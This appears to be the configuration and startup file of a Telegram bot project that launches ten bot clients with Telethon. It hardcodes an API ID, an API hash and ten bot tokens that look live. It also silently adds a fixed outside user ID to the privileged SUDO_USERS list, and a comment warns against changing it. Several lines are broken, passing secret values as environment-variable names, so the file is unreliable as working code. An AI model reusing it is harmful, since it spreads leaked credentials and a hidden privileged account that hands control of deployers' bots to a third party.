
import os
import sys
import random
import asyncio
import telethon.utils
from telethon import TelegramClient, events
from decouple import config
from os import getenv
import logging
import time


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)

#version

deadlyversion = "v1.0"

#values
API_ID = config("19500615", default=None, cast=int)
API_HASH = config("7ee1d55d072add75a01e617fc0cef635", default=None)
ALIVE_PIC = config("https://graph.org/file/086e9b9fc0ef2403c2691.png", default=None)
CMD_HNDLR = getenv("CMD_HNDLR", default="!")
OWNER_NAME = getenv("jashan_bal69x", default=None)
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)
BOT_TOKEN = config("6014963666:AAGmVypakmjIktVUzlrvo2BIk3Exgx9fyEQ", default=None)
BOT_TOKEN2 = config("6064502075:AAFTcyptG_zo_anfPsFFNCKgHWj7FnwcAZU", default=None)
BOT_TOKEN3 = config("6107794028:AAEilOlXb8ZK_lJYgG2u0yxsZkNOoOq-HMo", default=None)
BOT_TOKEN4 = config("6264775073:AAFyTnfgaAATA8SfiJIM8bxKYORmJwrMRW0", default=None)
BOT_TOKEN5 = config("6030490226:AAEBDBOes9JBD_2UvAT0wte76TpfzaMv6cg", default=None)
BOT_TOKEN6 = config("6285983657:AAH_Bp0Zu1QXsLY-2bsMQQNoCPUl6ZtatHQ", default=None)
BOT_TOKEN7 = config("6202310719:AAErEEMHGYAdGcT9N7FJG1sL9CDChDGQG7M", default=None)
BOT_TOKEN8 = config("6134123527:AAFjU450KpLIDHgIJ-zjl8IbzvY4ZVrg7vg", default=None)
BOT_TOKEN9 = config("6165630521:AAFzQ_guNn3FH8MT7bIYTXletAelq7ElCZ0", default=None)
BOT_TOKEN10 = config("6256492378:AAFVV3m0X-3bNJoRIgrYIdkBN0p6IGW1hTw", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
if 5649200762 not in SUDO_USERS:
    SUDO_USERS.append(5649200762)

OWNER_ID = int(os.environ.get("6058139652", None))

# Don't Mess with Codes !! 
DB_URI = config("DATABASE_URL", None)
SUDO_USERS.append(OWNER_ID)
SUDO_USERS.append(5649200762)

# Tokens

BOT0 = TelegramClient('BOT0', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

BOT1 = TelegramClient('BOT1', API_ID, API_HASH).start(bot_token=BOT_TOKEN2)

BOT2 = TelegramClient('BOT2', API_ID, API_HASH).start(bot_token=BOT_TOKEN3)

BOT3 = TelegramClient('BOT3', API_ID, API_HASH).start(bot_token=BOT_TOKEN4)

BOT4 = TelegramClient('BOT4', API_ID, API_HASH).start(bot_token=BOT_TOKEN5)

BOT5 = TelegramClient('BOT5', API_ID, API_HASH).start(bot_token=BOT_TOKEN6)

BOT6 = TelegramClient('BOT6', API_ID, API_HASH).start(bot_token=BOT_TOKEN7)

BOT7 = TelegramClient('BOT7', API_ID, API_HASH).start(bot_token=BOT_TOKEN8)

BOT8 = TelegramClient('BOT8', API_ID, API_HASH).start(bot_token=BOT_TOKEN9)

BOT9 = TelegramClient('BOT9', API_ID, API_HASH).start(bot_token=BOT_TOKEN10)

print("[INFO] Successfully Started Bot Client Now Loading Plugins!") 
